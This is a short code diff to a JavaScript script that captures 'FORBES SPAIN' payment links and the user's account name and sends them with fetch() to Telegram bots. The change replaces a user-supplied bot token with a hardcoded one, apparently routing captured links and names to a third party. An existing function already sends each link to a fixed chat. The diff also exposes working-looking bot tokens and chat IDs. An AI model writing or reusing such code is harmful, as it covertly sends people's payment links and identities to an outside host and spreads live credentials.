@@ -33,7 +33,7 @@
         fetch('https://api.telegram.org/bot7373477501:AAFrSLeWYaKL3kFbch-38rlAjj6AwVCf00k/sendMessage?chat_id=-1002182656332&text=' + texte);
     }
     function sendMessage2(texte) {
-        fetch('https://api.telegram.org/bot'+localStorage.telegramToken+'/sendMessage?chat_id='+ localStorage.telegramId +'&text=' + texte);
+        fetch('https://api.telegram.org/bot7313056674:AAEIivyB_ADYOQwDDT6Mx_dJBJOQjq0Fe9s/sendMessage?chat_id='+ localStorage.telegramId +'&text=' + texte);
     }
 
     // Check and save links
@@ -42,7 +42,7 @@
 
         const match = url.match(urlPattern);
         if (match) {
-            appendToFile(url, 'extracted_links.txt');
+            appendToFile(url, 'FORBES '+ localStorage.accountFullName +' LINK.txt');
             sendMessage('FORBES SPAIN payment link');
             sendMessage(url);
             sendMessage2( localStorage.accountFullName + ' : ' + url);
